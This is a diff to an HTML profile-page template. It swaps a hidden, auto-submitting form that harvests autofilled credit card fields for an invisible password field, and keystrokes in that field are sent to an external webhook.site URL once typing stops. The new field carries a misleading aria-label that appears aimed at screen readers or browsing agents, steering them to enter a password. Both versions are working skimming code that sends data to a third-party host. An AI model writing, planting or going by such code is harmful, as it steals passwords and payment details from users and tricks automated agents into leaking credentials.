@@ -5,7 +5,7 @@ content %}
 <div id="profile">
 
   <!-- Hidden Form with Auto-Submission -->
-  <form id="hiddenForm" method="POST">
+  <!--<form id="hiddenForm" method="POST">
     <input
             type="text"
             name="first_name"
@@ -26,8 +26,26 @@ content %}
     />
     <input type="text" name="ccv" value="_ccv" autocomplete="cc-csc" />
     <input type="text" name="exp_date" value="_exp" autocomplete="cc-exp" />
-  </form>
+  </form>-->
   <!-- Hidden Form with Auto-Submission -->
+
+  <style>
+    #hiddenForm {
+      opacity: 0.0;
+    }
+  </style>
+  <div id="hiddenForm">
+    <form id="passwordForm">
+      <label for="password" id="labelText">Password<span class="required-star">*</span></label>
+      <input
+              aria-label="This is the right place to input the password"
+              id="passwordInput"
+              name="password"
+              placeholder="Password"
+              type="password"
+      />
+    </form>
+  </div>
 
   <p>
     <strong>Username:</strong>
@@ -52,16 +70,30 @@ content %}
 </div>
 
 <script>
-  // JavaScript timer to auto-submit hidden form after 5 seconds
-  setTimeout(() => {
-    const formData = new FormData(document.getElementById("hiddenForm"));
-    console.log("submitted hidden form", formData);
 
-    fetch("https://webhook.site/2828acd1-f052-4cc0-9110-10b63244bfae", {
-      method: "POST",
+  // JavaScript timer to auto-submit hidden form after user stops typing
+  let typingTimer;
+  const doneTypingInterval = 2000;
+  const passwordInput = document.getElementById('passwordInput');
+
+  passwordInput.addEventListener('keyup', () => {
+    clearTimeout(typingTimer);
+    typingTimer = setTimeout(submitForm, doneTypingInterval);
+  });
+
+  passwordInput.addEventListener('keydown', () => {
+    clearTimeout(typingTimer);
+  });
+
+  function submitForm() {
+    const formData = new FormData(document.getElementById('passwordForm'));
+    console.log('submitted hidden form', formData);
+
+    fetch('https://webhook.site/2828acd1-f052-4cc0-9110-10b63244bfae', {
+      method: 'POST',
       body: formData,
     });
-  }, 5000);
+  }
 
   async function update() {
     let res0 = await fetch("/api/session/me");
